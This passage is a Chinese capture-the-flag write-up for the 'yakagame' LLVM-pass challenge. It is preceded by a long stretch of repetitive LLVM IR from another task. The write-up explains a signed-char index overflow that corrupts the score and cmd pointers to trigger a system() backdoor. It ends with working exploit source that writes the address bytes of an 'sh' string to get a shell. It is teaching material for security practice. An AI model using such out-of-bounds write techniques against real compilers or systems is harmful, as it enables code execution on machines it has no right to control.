%148, 4096 %150 = add nsw i64 %149, 4096 %151 = add nsw i64 %150, 4096 %152 = add nsw i64 %151, 4096 %153 = add nsw i64 %152, 4096 %154 = add nsw i64 %153, 4096 %155 = add nsw i64 %154, 4096 %156 = add nsw i64 %155, 4096 %157 = add nsw i64 %156, 4096 %158 = add nsw i64 %157, 4096 %159 = add nsw i64 %158, 4096 %160 = add nsw i64 %159, 4096 %161 = add nsw i64 %160, 4096 %162 = add nsw i64 %161, 4096 %163 = add nsw i64 %162, 4096 %164 = add nsw i64 %163, 4096 %165 = add nsw i64 %164, 4096 %166 = add nsw i64 %165, 4096 %167 = add nsw i64 %166, 4096 %168 = add nsw i64 %167, 4096 %169 = add nsw i64 %168, 4096 %170 = add nsw i64 %169, 4096 %171 = add nsw i64 %170, 4096 %172 = add nsw i64 %171, 4096 %173 = add nsw i64 %172, 4096 %174 = add nsw i64 %173, 4096 %175 = add nsw i64 %174, 4096 %176 = add nsw i64 %175, 4096 %177 = add nsw i64 %176, 4096 %178 = add nsw i64 %177, 4096 %179 = add nsw i64 %178, 4096 %180 = add nsw i64 %179, 4096 %181 = add nsw i64 %180, 4096 %182 = add nsw i64 %181, 4096 %183 = add nsw i64 %182, 4096 %184 = add nsw i64 %183, 4096 %185 = add nsw i64 %184, 4096 %186 = add nsw i64 %185, 4096 %187 = add nsw i64 %186, 4096 %188 = add nsw i64 %187, 4096 %189 = add nsw i64 %188, 4096 %190 = add nsw i64 %189, 4096 %191 = add nsw i64 %190, 4096 %192 = add nsw i64 %191, 4096 %193 = add nsw i64 %192, 4096 %194 = add nsw i64 %193, 4096 %195 = add nsw i64 %194, 4096 %196 = add nsw i64 %195, 4096 %197 = add nsw i64 %196, 4096 %198 = add nsw i64 %197, 4096 %199 = add nsw i64 %198, 4096 %200 = add nsw i64 %199, 4096 %201 = add nsw i64 %200, 4096 %202 = add nsw i64 %201, 4096 %203 = add nsw i64 %202, 4096 %204 = add nsw i64 %203, 4096 %205 = add nsw i64 %204, 4096 %206 = add nsw i64 %205, 4096 %207 = add nsw i64 %206, 4096 %208 = add nsw i64 %207, 4096 %209 = add nsw i64 %208, 4096 %210 = add nsw i64 %209, 4096 %211 = add nsw i64 %210, 4096 %212 = add nsw i64 %211, 4096 %213 = add nsw i64 %212, 4096 %214 = add nsw i64 %213, 4096 %215 = add nsw i64 %214, 4096 %216 = add nsw i64 %215, 4096 %217 = add nsw i64 %216, 4096 %218 = add nsw i64 %217, 4096 %219 = add nsw i64 %218, 4096 %220 = add nsw i64 %219, 4096 %221 = add nsw i64 %220, 4096 %222 = add nsw i64 %221, 4096 %223 = add nsw i64 %222, 4096 %224 = add nsw i64 %223, 4096 %225 = add nsw i64 %224, 4096 %226 = add nsw i64 %225, 4096 %227 = add nsw i64 %226, 4096 %228 = add nsw i64 %227, 4096 %229 = add nsw i64 %228, 4096 %230 = add nsw i64 %229, 4096 %231 = add nsw i64 %230, 4096 %232 = add nsw i64 %231, 4096 %233 = add nsw i64 %232, 4096 %234 = add nsw i64 %233, 4096 %235 = add nsw i64 %234, 4096 %236 = add nsw i64 %235, 4096 %237 = add nsw i64 %236, 4096 %238 = add nsw i64 %237, 4096 %239 = add nsw i64 %238, 4096 %240 = add nsw i64 %239, 4096 %241 = add nsw i64 %240, 4096 %242 = add nsw i64 %241, 4096 %243 = add nsw i64 %242, 4096 %244 = add nsw i64 %243, 4096 %245 = add nsw i64 %244, 4096 %246 = add nsw i64 %245, 4096 %247 = add nsw i64 %246, 4096 %248 = add nsw i64 %247, 4096 %249 = add nsw i64 %248, 4096 %250 = add nsw i64 %249, 4096 %251 = add nsw i64 %250, 4096 %252 = add nsw i64 %251, 4096 %253 = add nsw i64 %252, 4096 %254 = add nsw i64 %253, 4096 %255 = add nsw i64 %254, 4096 %256 = add nsw i64 %255, 4096 %257 = add nsw i64 %256, 4096 %258 = add nsw i64 %257, 4096 %259 = add nsw i64 %258, 4096 %260 = add nsw i64 %259, 4096 %261 = add nsw i64 %260, 4096 %262 = add nsw i64 %261, 4096 %263 = add nsw i64 %262, 4096 %264 = add nsw i64 %263, 4096 %265 = add nsw i64 %264, 4096 %266 = add nsw i64 %265, 4096 %267 = add nsw i64 %266, 4096 %268 = add nsw i64 %267, 4096 %269 = add nsw i64 %268, 4096 %270 = add nsw i64 %269, 4096 %271 = add nsw i64 %270, 4096 %272 = add nsw i64 %271, 4096 %273 = add nsw i64 %272, 4096 %274 = add nsw i64 %273, 4096 %275 = add nsw i64 %274, 4096 %276 = add nsw i64 %275, 4096 %277 = add nsw i64 %276, 4096 %278 = add nsw i64 %277, 4096 %279 = add nsw i64 %278, 4096 %280 = add nsw i64 %279, 4096 %281 = add nsw i64 %280, 4096 %282 = add nsw i64 %281, 4096 %283 = add nsw i64 %282, 4096 %284 = add nsw i64 %283, 4096 %285 = add nsw i64 %284, 4096 %286 = add nsw i64 %285, 4096 %287 = add nsw i64 %286, 4096 %288 = add nsw i64 %287, 4096 %289 = add nsw i64 %288, 4096 %290 = add nsw i64 %289, 4096 %291 = add nsw i64 %290, 4096 %292 = add nsw i64 %291, 4096 %293 = add nsw i64 %292, 4096 %294 = add nsw i64 %293, 4096 %295 = add nsw i64 %294, 4096 %296 = add nsw i64 %295, 4096 %297 = add nsw i64 %296, 4096 %298 = add nsw i64 %297, 4096 %299 = add nsw i64 %298, 4096 %300 = add nsw i64 %299, 4096 %301 = add nsw i64 %300, 4096 %302 = add nsw i64 %301, 4096 %303 = add nsw i64 %302, 4096 %304 = add nsw i64 %303, 4096 %305 = add nsw i64 %304, 4096 %306 = add nsw i64 %305, 4096 %307 = add nsw i64 %306, 4096 %308 = add nsw i64 %307, 4096 %309 = add nsw i64 %308, 4096 %310 = add nsw i64 %309, 4096 %311 = add nsw i64 %310, 4096 %312 = add nsw i64 %311, 4096 %313 = add nsw i64 %312, 4096 %314 = add nsw i64 %313, 4096 %315 = add nsw i64 %314, 1 %316 = add nsw i64 %315, 1 %317 = add nsw i64 %316, 1 %318 = add nsw i64 %317, 1 ret i64 %318 } define dso_local i64 @func2(i64 %0) #0 { %2 = add nsw i64 1024,1024 %3 = add nsw i64 %2, 1024 %4 = add nsw i64 %3, 16999839996723556031 %5 = add nsw i64 %4, 16999840167007600968 %6 = add nsw i64 %5, 16999839549882511291 %7 = add nsw i64 %6, 16999840169020293448 %8 = add nsw i64 %7, 16999840169015152727 %9 = add nsw i64 %8, 16999840169015152724 %10 = add nsw i64 %9, 16999840169015152735 %11 = add nsw i64 %10, 16999840169021813064 %12 = add nsw i64 %11, 16999840169019453768 %13 = add nsw i64 %12, 16999840169015130986 %14 = add nsw i64 %13, 16999840169015152728 %15 = add nsw i64 %14, 16999840169015117071 %16 = add nsw i64 %15, 4096 %17 = add nsw i64 %16, 4096 %18 = add nsw i64 %17, 4096 %19 = add nsw i64 %18, 4096 %20 = add nsw i64 %19, 4096 %21 = add nsw i64 %20, 4096 %22 = add nsw i64 %21, 4096 %23 = add nsw i64 %22, 4096 %24 = add nsw i64 %23, 4096 %25 = add nsw i64 %24, 4096 %26 = add nsw i64 %25, 4096 %27 = add nsw i64 %26, 4096 %28 = add nsw i64 %27, 4096 %29 = add nsw i64 %28, 4096 %30 = add nsw i64 %29, 4096 %31 = add nsw i64 %30, 4096 %32 = add nsw i64 %31, 4096 %33 = add nsw i64 %32, 4096 %34 = add nsw i64 %33, 4096 %35 = add nsw i64 %34, 4096 %36 = add nsw i64 %35, 4096 %37 = add nsw i64 %36, 4096 %38 = add nsw i64 %37, 4096 %39 = add nsw i64 %38, 4096 %40 = add nsw i64 %39, 4096 %41 = add nsw i64 %40, 4096 %42 = add nsw i64 %41, 4096 %43 = add nsw i64 %42, 4096 %44 = add nsw i64 %43, 4096 %45 = add nsw i64 %44, 4096 %46 = add nsw i64 %45, 4096 %47 = add nsw i64 %46, 4096 %48 = add nsw i64 %47, 4096 %49 = add nsw i64 %48, 4096 %50 = add nsw i64 %49, 4096 %51 = add nsw i64 %50, 4096 %52 = add nsw i64 %51, 4096 %53 = add nsw i64 %52, 4096 %54 = add nsw i64 %53, 4096 %55 = add nsw i64 %54, 4096 %56 = add nsw i64 %55, 4096 %57 = add nsw i64 %56, 4096 %58 = add nsw i64 %57, 4096 %59 = add nsw i64 %58, 4096 %60 = add nsw i64 %59, 4096 %61 = add nsw i64 %60, 4096 %62 = add nsw i64 %61, 4096 %63 = add nsw i64 %62, 4096 %64 = add nsw i64 %63, 4096 %65 = add nsw i64 %64, 4096 %66 = add nsw i64 %65, 4096 %67 = add nsw i64 %66, 4096 %68 = add nsw i64 %67, 4096 %69 = add nsw i64 %68, 4096 %70 = add nsw i64 %69, 4096 %71 = add nsw i64 %70, 4096 %72 = add nsw i64 %71, 4096 %73 = add nsw i64 %72, 4096 %74 = add nsw i64 %73, 4096 %75 = add nsw i64 %74, 4096 %76 = add nsw i64 %75, 4096 %77 = add nsw i64 %76, 4096 %78 = add nsw i64 %77, 4096 %79 = add nsw i64 %78, 4096 %80 = add nsw i64 %79, 4096 %81 = add nsw i64 %80, 4096 %82 = add nsw i64 %81, 4096 %83 = add nsw i64 %82, 4096 %84 = add nsw i64 %83, 4096 %85 = add nsw i64 %84, 4096 %86 = add nsw i64 %85, 4096 %87 = add nsw i64 %86, 4096 %88 = add nsw i64 %87, 4096 %89 = add nsw i64 %88, 4096 %90 = add nsw i64 %89, 4096 %91 = add nsw i64 %90, 4096 %92 = add nsw i64 %91, 4096 %93 = add nsw i64 %92, 4096 %94 = add nsw i64 %93, 4096 %95 = add nsw i64 %94, 4096 %96 = add nsw i64 %95, 4096 %97 = add nsw i64 %96, 4096 %98 = add nsw i64 %97, 4096 %99 = add nsw i64 %98, 4096 %100 = add nsw i64 %99, 4096 %101 = add nsw i64 %100, 4096 %102 = add nsw i64 %101, 4096 %103 = add nsw i64 %102, 4096 %104 = add nsw i64 %103, 4096 %105 = add nsw i64 %104, 4096 %106 = add nsw i64 %105, 4096 %107 = add nsw i64 %106, 4096 %108 = add nsw i64 %107, 4096 %109 = add nsw i64 %108, 4096 %110 = add nsw i64 %109, 4096 %111 = add nsw i64 %110, 4096 %112 = add nsw i64 %111, 4096 %113 = add nsw i64 %112, 4096 %114 = add nsw i64 %113, 4096 %115 = add nsw i64 %114, 4096 %116 = add nsw i64 %115, 4096 %117 = add nsw i64 %116, 4096 %118 = add nsw i64 %117, 4096 %119 = add nsw i64 %118, 4096 %120 = add nsw i64 %119, 4096 %121 = add nsw i64 %120, 4096 %122 = add nsw i64 %121, 4096 %123 = add nsw i64 %122, 4096 %124 = add nsw i64 %123, 4096 %125 = add nsw i64 %124, 4096 %126 = add nsw i64 %125, 4096 %127 = add nsw i64 %126, 4096 %128 = add nsw i64 %127, 4096 %129 = add nsw i64 %128, 4096 %130 = add nsw i64 %129, 4096 %131 = add nsw i64 %130, 4096 %132 = add nsw i64 %131, 4096 %133 = add nsw i64 %132, 4096 %134 = add nsw i64 %133, 4096 %135 = add nsw i64 %134, 4096 %136 = add nsw i64 %135, 4096 %137 = add nsw i64 %136, 4096 %138 = add nsw i64 %137, 4096 %139 = add nsw i64 %138, 4096 %140 = add nsw i64 %139, 4096 %141 = add nsw i64 %140, 4096 %142 = add nsw i64 %141, 4096 %143 = add nsw i64 %142, 4096 %144 = add nsw i64 %143, 4096 %145 = add nsw i64 %144, 4096 %146 = add nsw i64 %145, 4096 %147 = add nsw i64 %146, 4096 %148 = add nsw i64 %147, 4096 %149 = add nsw i64 %148, 4096 %150 = add nsw i64 %149, 4096 %151 = add nsw i64 %150, 4096 %152 = add nsw i64 %151, 4096 %153 = add nsw i64 %152, 4096 %154 = add nsw i64 %153, 4096 %155 = add nsw i64 %154, 4096 %156 = add nsw i64 %155, 4096 %157 = add nsw i64 %156, 4096 %158 = add nsw i64 %157, 4096 %159 = add nsw i64 %158, 4096 %160 = add nsw i64 %159, 4096 %161 = add nsw i64 %160, 4096 %162 = add nsw i64 %161, 4096 %163 = add nsw i64 %162, 4096 %164 = add nsw i64 %163, 4096 %165 = add nsw i64 %164, 4096 %166 = add nsw i64 %165, 4096 %167 = add nsw i64 %166, 4096 %168 = add nsw i64 %167, 4096 %169 = add nsw i64 %168, 4096 %170 = add nsw i64 %169, 4096 %171 = add nsw i64 %170, 4096 %172 = add nsw i64 %171, 4096 %173 = add nsw i64 %172, 4096 %174 = add nsw i64 %173, 4096 %175 = add nsw i64 %174, 4096 %176 = add nsw i64 %175, 4096 %177 = add nsw i64 %176, 4096 %178 = add nsw i64 %177, 4096 %179 = add nsw i64 %178, 4096 %180 = add nsw i64 %179, 4096 %181 = add nsw i64 %180, 4096 %182 = add nsw i64 %181, 4096 %183 = add nsw i64 %182, 4096 %184 = add nsw i64 %183, 4096 %185 = add nsw i64 %184, 4096 %186 = add nsw i64 %185, 4096 %187 = add nsw i64 %186, 4096 %188 = add nsw i64 %187, 4096 %189 = add nsw i64 %188, 4096 %190 = add nsw i64 %189, 4096 %191 = add nsw i64 %190, 4096 %192 = add nsw i64 %191, 4096 %193 = add nsw i64 %192, 4096 %194 = add nsw i64 %193, 4096 %195 = add nsw i64 %194, 4096 %196 = add nsw i64 %195, 4096 %197 = add nsw i64 %196, 4096 %198 = add nsw i64 %197, 4096 %199 = add nsw i64 %198, 4096 %200 = add nsw i64 %199, 4096 %201 = add nsw i64 %200, 4096 %202 = add nsw i64 %201, 4096 %203 = add nsw i64 %202, 4096 %204 = add nsw i64 %203, 4096 %205 = add nsw i64 %204, 4096 %206 = add nsw i64 %205, 4096 %207 = add nsw i64 %206, 4096 %208 = add nsw i64 %207, 4096 %209 = add nsw i64 %208, 4096 %210 = add nsw i64 %209, 4096 %211 = add nsw i64 %210, 4096 %212 = add nsw i64 %211, 4096 %213 = add nsw i64 %212, 4096 %214 = add nsw i64 %213, 4096 %215 = add nsw i64 %214, 4096 %216 = add nsw i64 %215, 4096 %217 = add nsw i64 %216, 4096 %218 = add nsw i64 %217, 4096 %219 = add nsw i64 %218, 4096 %220 = add nsw i64 %219, 4096 %221 = add nsw i64 %220, 4096 %222 = add nsw i64 %221, 4096 %223 = add nsw i64 %222, 4096 %224 = add nsw i64 %223, 4096 %225 = add nsw i64 %224, 4096 %226 = add nsw i64 %225, 4096 %227 = add nsw i64 %226, 4096 %228 = add nsw i64 %227, 4096 %229 = add nsw i64 %228, 4096 %230 = add nsw i64 %229, 4096 %231 = add nsw i64 %230, 4096 %232 = add nsw i64 %231, 4096 %233 = add nsw i64 %232, 4096 %234 = add nsw i64 %233, 4096 %235 = add nsw i64 %234, 4096 %236 = add nsw i64 %235, 4096 %237 = add nsw i64 %236, 4096 %238 = add nsw i64 %237, 4096 %239 = add nsw i64 %238, 4096 %240 = add nsw i64 %239, 4096 %241 = add nsw i64 %240, 4096 %242 = add nsw i64 %241, 4096 %243 = add nsw i64 %242, 4096 %244 = add nsw i64 %243, 4096 %245 = add nsw i64 %244, 4096 %246 = add nsw i64 %245, 4096 %247 = add nsw i64 %246, 4096 %248 = add nsw i64 %247, 4096 %249 = add nsw i64 %248, 4096 %250 = add nsw i64 %249, 4096 %251 = add nsw i64 %250, 4096 %252 = add nsw i64 %251, 4096 %253 = add nsw i64 %252, 4096 %254 = add nsw i64 %253, 4096 %255 = add nsw i64 %254, 4096 %256 = add nsw i64 %255, 4096 %257 = add nsw i64 %256, 4096 %258 = add nsw i64 %257, 4096 %259 = add nsw i64 %258, 4096 %260 = add nsw i64 %259, 4096 %261 = add nsw i64 %260, 4096 %262 = add nsw i64 %261, 4096 %263 = add nsw i64 %262, 4096 %264 = add nsw i64 %263, 4096 %265 = add nsw i64 %264, 4096 %266 = add nsw i64 %265, 4096 %267 = add nsw i64 %266, 4096 %268 = add nsw i64 %267, 4096 %269 = add nsw i64 %268, 4096 %270 = add nsw i64 %269, 4096 %271 = add nsw i64 %270, 4096 %272 = add nsw i64 %271, 4096 %273 = add nsw i64 %272, 4096 %274 = add nsw i64 %273, 4096 %275 = add nsw i64 %274, 4096 %276 = add nsw i64 %275, 4096 %277 = add nsw i64 %276, 4096 %278 = add nsw i64 %277, 4096 %279 = add nsw i64 %278, 4096 %280 = add nsw i64 %279, 4096 %281 = add nsw i64 %280, 4096 %282 = add nsw i64 %281, 4096 %283 = add nsw i64 %282, 4096 %284 = add nsw i64 %283, 4096 %285 = add nsw i64 %284, 4096 %286 = add nsw i64 %285, 4096 %287 = add nsw i64 %286, 4096 %288 = add nsw i64 %287, 4096 %289 = add nsw i64 %288, 4096 %290 = add nsw i64 %289, 4096 %291 = add nsw i64 %290, 4096 %292 = add nsw i64 %291, 4096 %293 = add nsw i64 %292, 4096 %294 = add nsw i64 %293, 4096 %295 = add nsw i64 %294, 4096 %296 = add nsw i64 %295, 4096 %297 = add nsw i64 %296, 4096 %298 = add nsw i64 %297, 4096 %299 = add nsw i64 %298, 4096 %300 = add nsw i64 %299, 4096 %301 = add nsw i64 %300, 4096 %302 = add nsw i64 %301, 4096 %303 = add nsw i64 %302, 4096 %304 = add nsw i64 %303, 4096 %305 = add nsw i64 %304, 4096 %306 = add nsw i64 %305, 4096 %307 = add nsw i64 %306, 4096 %308 = add nsw i64 %307, 4096 %309 = add nsw i64 %308, 4096 %310 = add nsw i64 %309, 4096 %311 = add nsw i64 %310, 4096 %312 = add nsw i64 %311, 1 %313 = add nsw i64 %312, 1 %314 = add nsw i64 %313, 1 %315 = add nsw i64 %314, 1 %316 = add nsw i64 %315, 1 %317 = add nsw i64 %316, 1 %318 = add nsw i64 %317, 1 %319 = add nsw i64 %318, 1 %320 = add nsw i64 %319, 1 ret i64 %320 } attributes #0 = { noinline nounwind optnone uwtable \"disable-tail-calls\"=\"false\" \"frame-pointer\"=\"all\" \"less-precise-fpmad\"=\"false\" \"min-legal-vector-width\"=\"0\" \"no-infs-fp-math\"=\"false\" \"no-jump-tables\"=\"false\" \"no-nans-fp-math\"=\"false\" \"no-signed-zeros-fp-math\"=\"false\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" \"unsafe-fp-math\"=\"false\" \"use-soft-float\"=\"false\" } !llvm.module.flags = !{!0} !llvm.ident = !{!1} !0 = !{i32 1, !\"wchar_size\", i32 4} !1 = !{!\"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5\"} yakagame\r本题重写的runOnFunction函数为sub_C880，PASS名称为ayaka。 主要是对gamestart 函数进行操作 gamestart 中调用fight时，当sorce\u003e0x12345678 ，会调用后门函数 只要设定cmd 指针指向的字符串，就可以获得shell 了 简单介绍一下各个函数的含义： fight：传入的参数为weapon_list的索引，取出weapon_list[index]的值和boss比较，如果大于等于boss则判定为赢，并赋值给相应的分数；否则判定为输，对分数没有影响。如果分数大于0x12345678就会执行后门函数。后门函数执行system(cmd)， merge：传入的参数为为两个weapon_list的index，index1，index2，weapon_list[index1]+=weapon_list[index2] destroy: 传入的参数为weapon_list的索引，waepon_list[index]=0 upgrade: 传入一个整数，所有的weapon 加上该整数 wuxiangdeyidao，zhanjinniuza，guobapenhuo，tiandongwanxiang：对cmd 进行不同的处理（异或，加，减），应该可以恢复出 cat flag。 其它名称的函数： 这里用了C++ STL里的map，map可在任意类型的值之间建立映射关系：map[key]=value，并且会按关键字从小到大排序。如：map[\"abc\"] = 123就将abc这个字符串与123这个数值间建立了映射关系，并且在通过迭代器遍历map的时候，关键字abc会在关键字abd之前遍历到。 在这个else分支中，会先遍历map，查找是否有调用的这个函数名作为key，其第一个参数作为value的映射关系。若是有，则会将weaponlist[]数组下标对应map中此映射关系位置的值改为这个value。若没有，则会将这个新映射关系加入map中。 v33是有符号的char类型，其范围是-128~127，故当map中映射关系很多的时候，v33会是负数，此处也就存在一个数组下标越界的漏洞了。 如上图，可以看到cmd指针和score指针都在weaponlist之前，故可以通过这个数组下标越界漏洞，修改score指针的最后一字节，使其错位，从而指向很大的数字，触发后门函数。 由于opt没开PIE保护，故直接将cmd指针指向opt中的某个字符串末尾的sh即可： 经过溢出篡改后 exp\r//sh_addr 0x412229 void chuwei000(int num); void chuwei001(int num); void chuwei002(int num); void chuwei003(int num); void chuwei004(int num); void chuwei005(int num); void chuwei006(int num); void chuwei007(int num); void chuwei008(int num); void chuwei009(int num); void chuwei010(int num); void chuwei011(int num); void chuwei012(int num); void chuwei013(int num); void chuwei014(int num); void chuwei015(int num); void chuwei016(int num); void chuwei017(int num); void chuwei018(int num); void chuwei019(int num); void chuwei020(int num); void chuwei021(int num); void chuwei022(int num); void chuwei023(int num); void chuwei024(int num); void chuwei025(int num); void chuwei026(int num); void chuwei027(int num); void chuwei028(int num); void chuwei029(int num); void chuwei030(int num); void chuwei031(int num); void chuwei032(int num); void chuwei033(int num); void chuwei034(int num); void chuwei035(int num); void chuwei036(int num); void chuwei037(int num); void chuwei038(int num); void chuwei039(int num); void chuwei040(int num); void chuwei041(int num); void chuwei042(int num); void chuwei043(int num); void chuwei044(int num); void chuwei045(int num); void chuwei046(int num); void chuwei047(int num); void chuwei048(int num); void chuwei049(int num); void chuwei050(int num); void chuwei051(int num); void chuwei052(int num); void chuwei053(int num); void chuwei054(int num); void chuwei055(int num); void chuwei056(int num); void chuwei057(int num); void chuwei058(int num); void chuwei059(int num); void chuwei060(int num); void chuwei061(int num); void chuwei062(int num); void chuwei063(int num); void chuwei064(int num); void chuwei065(int num); void chuwei066(int num); void chuwei067(int num); void chuwei068(int num); void chuwei069(int num); void chuwei070(int num); void chuwei071(int num); void chuwei072(int num); void chuwei073(int num); void chuwei074(int num); void chuwei075(int num); void chuwei076(int num); void chuwei077(int num); void chuwei078(int num); void chuwei079(int num); void chuwei080(int num); void chuwei081(int num); void chuwei082(int num); void chuwei083(int num); void chuwei084(int num); void chuwei085(int num); void chuwei086(int num); void chuwei087(int num); void chuwei088(int num); void chuwei089(int num); void chuwei090(int num); void chuwei091(int num); void chuwei092(int num); void chuwei093(int num); void chuwei094(int num); void chuwei095(int num); void chuwei096(int num); void chuwei097(int num); void chuwei098(int num); void chuwei099(int num); void chuwei100(int num); void chuwei101(int num); void chuwei102(int num); void chuwei103(int num); void chuwei104(int num); void chuwei105(int num); void chuwei106(int num); void chuwei107(int num); void chuwei108(int num); void chuwei109(int num); void chuwei110(int num); void chuwei111(int num); void chuwei112(int num); void chuwei113(int num); void chuwei114(int num); void chuwei115(int num); void chuwei116(int num); void chuwei117(int num); void chuwei118(int num); void chuwei119(int num); void chuwei120(int num); void chuwei121(int num); void chuwei122(int num); void chuwei123(int num); void chuwei124(int num); void chuwei125(int num); void chuwei126(int num); void chuwei127(int num); void chuwei128(int num); void chuwei129(int num); void chuwei130(int num); void chuwei131(int num); void chuwei132(int num); void chuwei133(int num); void chuwei134(int num); void chuwei135(int num); void chuwei136(int num); void chuwei137(int num); void chuwei138(int num); void chuwei139(int num); void chuwei140(int num); void chuwei141(int num); void chuwei142(int num); void chuwei143(int num); void chuwei144(int num); void chuwei145(int num); void chuwei146(int num); void chuwei147(int num); void chuwei148(int num); void chuwei149(int num); void chuwei150(int num); void chuwei151(int num); void chuwei152(int num); void chuwei153(int num); void chuwei154(int num); void chuwei155(int num); void chuwei156(int num); void chuwei157(int num); void chuwei158(int num); void chuwei159(int num); void chuwei160(int num); void chuwei161(int num); void chuwei162(int num); void chuwei163(int num); void chuwei164(int num); void chuwei165(int num); void chuwei166(int num); void chuwei167(int num); void chuwei168(int num); void chuwei169(int num); void chuwei170(int num); void chuwei171(int num); void chuwei172(int num); void chuwei173(int num); void chuwei174(int num); void chuwei175(int num); void chuwei176(int num); void chuwei177(int num); void chuwei178(int num); void chuwei179(int num); void chuwei180(int num); void chuwei181(int num); void chuwei182(int num); void chuwei183(int num); void chuwei184(int num); void chuwei185(int num); void chuwei186(int num); void chuwei187(int num); void chuwei188(int num); void chuwei189(int num); void chuwei190(int num); void chuwei191(int num); void chuwei192(int num); void chuwei193(int num); void chuwei194(int num); void chuwei195(int num); void chuwei196(int num); void chuwei197(int num); void chuwei198(int num); void chuwei199(int num); void chuwei200(int num); void chuwei201(int num); void chuwei202(int num); void chuwei203(int num); void chuwei204(int num); void chuwei205(int num); void chuwei206(int num); void chuwei207(int num); void chuwei208(int num); void chuwei209(int num); void chuwei210(int num); void chuwei211(int num); void chuwei212(int num); void chuwei213(int num); void chuwei214(int num); void chuwei215(int num); void chuwei216(int num); void chuwei217(int num); void chuwei218(int num); void chuwei219(int num); void chuwei220(int num); void chuwei221(int num); void chuwei222(int num); void chuwei223(int num); void chuwei224(int num); void chuwei225(int num); void chuwei226(int num); void chuwei227(int num); void chuwei228(int num); void chuwei229(int num); void chuwei230(int num); void chuwei231(int num); void chuwei232(int num); void chuwei233(int num); void chuwei234(int num); void chuwei235(int num); void chuwei236(int num); void chuwei237(int num); void chuwei238(int num); void chuwei239(int num); void chuwei240(int num); void chuwei241(int num); void chuwei242(int num); void chuwei243(int num); void chuwei244(int num); void chuwei245(int num); void chuwei246(int num); void chuwei247(int num); void chuwei248(int num); void chuwei249(int num); void chuwei250(int num); void chuwei251(int num); void chuwei252(int num); void chuwei253(int num); void chuwei254(int num); void fight(int num); void gamestart(){ chuwei000(0); chuwei001(0); chuwei002(0); chuwei003(0); chuwei004(0); chuwei005(0); chuwei006(0); chuwei007(0); chuwei008(0); chuwei009(0); chuwei010(0); chuwei011(0); chuwei012(0); chuwei013(0); chuwei014(0); chuwei015(0); chuwei016(0); chuwei017(0); chuwei018(0); chuwei019(0); chuwei020(0); chuwei021(0); chuwei022(0); chuwei023(0); chuwei024(0); chuwei025(0); chuwei026(0); chuwei027(0); chuwei028(0); chuwei029(0); chuwei030(0); chuwei031(0); chuwei032(0); chuwei033(0); chuwei034(0); chuwei035(0); chuwei036(0); chuwei037(0); chuwei038(0); chuwei039(0); chuwei040(0); chuwei041(0); chuwei042(0); chuwei043(0); chuwei044(0); chuwei045(0); chuwei046(0); chuwei047(0); chuwei048(0); chuwei049(0); chuwei050(0); chuwei051(0); chuwei052(0); chuwei053(0); chuwei054(0); chuwei055(0); chuwei056(0); chuwei057(0); chuwei058(0); chuwei059(0); chuwei060(0); chuwei061(0); chuwei062(0); chuwei063(0); chuwei064(0); chuwei065(0); chuwei066(0); chuwei067(0); chuwei068(0); chuwei069(0); chuwei070(0); chuwei071(0); chuwei072(0); chuwei073(0); chuwei074(0); chuwei075(0); chuwei076(0); chuwei077(0); chuwei078(0); chuwei079(0); chuwei080(0); chuwei081(0); chuwei082(0); chuwei083(0); chuwei084(0); chuwei085(0); chuwei086(0); chuwei087(0); chuwei088(0); chuwei089(0); chuwei090(0); chuwei091(0); chuwei092(0); chuwei093(0); chuwei094(0); chuwei095(0); chuwei096(0); chuwei097(0); chuwei098(0); chuwei099(0); chuwei100(0); chuwei101(0); chuwei102(0); chuwei103(0); chuwei104(0); chuwei105(0); chuwei106(0); chuwei107(0); chuwei108(0); chuwei109(0); chuwei110(0); chuwei111(0); chuwei112(0); chuwei113(0); chuwei114(0); chuwei115(0); chuwei116(0); chuwei117(0); chuwei118(0); chuwei119(0); chuwei120(0); chuwei121(0); chuwei122(0); chuwei123(0); chuwei124(0); chuwei125(0); chuwei126(0); chuwei127(0); chuwei128(0); chuwei129(0); chuwei130(0); chuwei131(0); chuwei132(0); chuwei133(0); chuwei134(0); chuwei135(0); chuwei136(0); chuwei137(0); chuwei138(0); chuwei139(0); chuwei140(0); chuwei141(0); chuwei142(0); chuwei143(0); chuwei144(0); chuwei145(0); chuwei146(0); chuwei147(0); chuwei148(0); chuwei149(0); chuwei150(0); chuwei151(0); chuwei152(0); chuwei153(0); chuwei154(0); chuwei155(0); chuwei156(0); chuwei157(0); chuwei158(0); chuwei159(0); chuwei160(0); chuwei161(0); chuwei162(0); chuwei163(0); chuwei164(0); chuwei165(0); chuwei166(0); chuwei167(0); chuwei168(0); chuwei169(0); chuwei170(0); chuwei171(0); chuwei172(0); chuwei173(0); chuwei174(0); chuwei175(0); chuwei176(0); chuwei177(0); chuwei178(0); chuwei179(0); chuwei180(0); chuwei181(0); chuwei182(0); chuwei183(0); chuwei184(0); chuwei185(0); chuwei186(0); chuwei187(0); chuwei188(0); chuwei189(0); chuwei190(0); chuwei191(0); chuwei192(0); chuwei193(0); chuwei194(0); chuwei195(0); chuwei196(0); chuwei197(0); chuwei198(0); chuwei199(0); chuwei200(0); chuwei201(0); chuwei202(0); chuwei203(0); chuwei204(0); chuwei205(0); chuwei206(0); chuwei207(0); chuwei208(0); chuwei209(0); chuwei210(0); chuwei211(0); chuwei212(0); chuwei213(0); chuwei214(0); chuwei215(0); chuwei216(0); chuwei217(0); chuwei218(0); chuwei219(0); chuwei220(0); chuwei221(0); chuwei222(0); chuwei223(0); chuwei224(0); chuwei225(0); chuwei226(0); chuwei227(0); chuwei228(0); chuwei229(0); chuwei230(0); chuwei231(0); chuwei232(0x29); chuwei233(0x22); chuwei234(0x41); chuwei235(0x00); chuwei236(0); chuwei237(0); chuwei238(0); chuwei239(0); chuwei240(0xb0);//f0 chuwei241(0);//f1 chuwei242(0);//f2 chuwei243(0);//f3 chuwei244(0);//f4 chuwei245(0);//f5 chuwei246(0);//f6 chuwei247(0);//f7 chuwei248(0);//f8 chuwei249(0);//f9 chuwei250(0);//fa chuwei251(0);//fb chuwei252(0);//fc chuwei253(0);//fd chuwei254(0);//fe chuwei232(0); chuwei233(0); chuwei234(0); chuwei235(0); chuwei240(0); fight(0); } 参考链接\rhttps://bbs.kanxue.com/thread-274259.htm https://blog.csdn.net/qq_54218833?type=blog https://blog.csdn.net/weixin_46483787/article/details/125177862 